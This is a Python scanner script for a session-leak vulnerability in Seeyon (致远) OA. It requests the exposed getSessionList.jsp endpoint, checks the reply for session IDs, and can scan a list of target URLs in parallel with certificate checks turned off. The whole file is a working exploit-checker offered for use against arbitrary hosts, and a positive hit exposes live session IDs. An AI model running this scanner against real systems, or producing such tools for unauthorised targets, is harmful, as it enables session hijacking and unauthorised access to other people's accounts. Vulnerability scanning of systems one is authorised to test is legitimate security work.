import time
import argparse
import requests
import multiprocessing
from rich.console import Console

console = Console()


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url = target_url + "yyoa/ext/https/getSessionList.jsp?cmd=getAll"
    console.print(now_time() + " [INFO]     正在检测致远OA getSessionList.jsp Session泄漏漏洞", style='bold blue')
    console.print(now_time() + " [INFO]     正在请求 {}".format(vuln_url), style='bold blue')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "/yyoa/index.jsp" not in response.text and "<sessionID>" in response.text and response.status_code == 200:
            console.print(
                now_time() + ' [SUCCESS]  目标存在致远OA getSessionList.jsp Session泄漏漏洞, Session地址: {} '.format(vuln_url),
                style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  不存在致远OA getSessionList.jsp Session泄漏漏洞', style='bold yellow')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')
